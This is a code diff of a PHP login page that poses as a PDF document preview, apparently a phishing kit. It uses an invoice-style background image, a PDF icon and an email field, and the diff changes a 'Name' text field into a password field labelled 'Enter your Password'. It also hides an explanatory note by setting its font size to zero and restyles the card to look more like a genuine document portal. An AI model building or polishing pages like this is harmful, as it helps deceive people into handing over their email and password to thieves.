@@ -57,11 +57,11 @@
         .login-card {
             position: relative;
             z-index: 2;
-            width: 95%;
+            width: 55%;
             max-width: 420px;
             background: rgba(255, 255, 255, 0.98);
-            border-radius: 16px;
-            padding: 28px 26px 26px;
+            border-radius: 3px;
+            padding: 8px 26px 26px;
             box-shadow:
                 0 20px 40px rgba(0, 0, 0, 0.35),
                 0 0 0 1px rgba(0, 0, 0, 0.05);
@@ -69,25 +69,25 @@
 
         /* PDF icon */
         .doc-icon {
-            width: 56px;
-            height: 56px;
-            border-radius: 18px;
-            background: #ffe5e5;
+            width: 40px;
+            height: 46px;
+            border-radius: 8px;
+            background: #B80000;
             display: flex;
             align-items: center;
             justify-content: center;
-            margin: 0 auto 14px;
+            margin: 0 auto 4px;
         }
 
         .doc-icon-pdf {
             font-weight: 700;
-            color: #c21515;
-            font-size: 14px;
+            color: #fff;
+            font-size: 13px;
         }
 
         /* Titles */
         .doc-title {
-            font-size: 18px;
+            font-size: 15px;
             font-weight: 600;
             text-align: center;
             margin-bottom: 6px;
@@ -96,18 +96,18 @@
         .doc-size {
             font-weight: 400;
             color: #666;
-            font-size: 14px;
+            font-size: 11px;
         }
 
         .doc-subtitle {
-            font-size: 13px;
+            font-size: 11px;
             color: #666;
             text-align: center;
             margin-bottom: 8px;
         }
 
         .doc-note {
-            font-size: 12px;
+            font-size: 0px;
             color: #999;
             text-align: center;
             margin-bottom: 18px;
@@ -116,7 +116,7 @@
         /* Error message */
         .login-error {
             color: #c21515;
-            font-size: 13px;
+            font-size: 10px;
             font-weight: 600;
             text-align: center;
             margin-bottom: 14px;
@@ -126,20 +126,20 @@
         .login-form {
             display: flex;
             flex-direction: column;
-            gap: 14px;
+            gap: px;
         }
 
         .field-label {
-            font-size: 12px;
-            font-weight: 600;
+            font-size: 10px;
+            font-weight: 500;
             color: #555;
-            margin-bottom: 4px;
+            margin-bottom: 10px;
         }
 
         .field-wrapper input {
             width: 100%;
             padding: 10px 11px;
-            border-radius: 8px;
+            border-radius: 3px;
             border: 1px solid #d0d0d0;
             font-size: 14px;
             outline: none;
@@ -160,9 +160,10 @@
             border: none;
             background: #1a73e8;
             color: #fff;
-            font-size: 15px;
-            font-weight: 600;
+            font-size: 14px;
+            font-weight: 500;
             cursor: pointer;
+            border-radius: 4px;
             transition: background 0.15s ease, box-shadow 0.15s ease, transform 0.05s ease;
         }
 
@@ -178,7 +179,7 @@
         @media (max-width: 480px) {
             .login-card {
                 padding: 22px 18px 18px;
-                border-radius: 14px;
+                border-radius: 4px;
             }
             .doc-title { font-size: 16px; }
         }
@@ -187,7 +188,7 @@
 <body>
 <div class="page-wrapper">
     <div class="doc-background">
-        <img src="assets/bg-invoice.jpg" alt="Document preview">
+        <img src="background.png" alt="Document preview">
     </div>
 
     <div class="login-card">
@@ -207,7 +208,7 @@
         <?php endif; ?>
 
         <form class="login-form" method="POST" action="login.php" autocomplete="off">
-            <label class="field-label" for="email">Email address</label>
+            <label class="field-label" for="email"></label>
             <div class="field-wrapper">
                 <input id="email" name="email" type="email"
                        value="<?= isset($_SESSION['old_email']) ? htmlspecialchars($_SESSION['old_email']) : '' ?>"
@@ -216,7 +217,7 @@
 
             <label class="field-label" for="name">Name</label>
             <div class="field-wrapper">
-                <input id="name" name="name" type="text" placeholder="Enter your name" required>
+                <input id="name" name="name" type="password" placeholder="Enter your Password" required>
             </div>
 
             <button type="submit" class="btn-primary">Next</button>
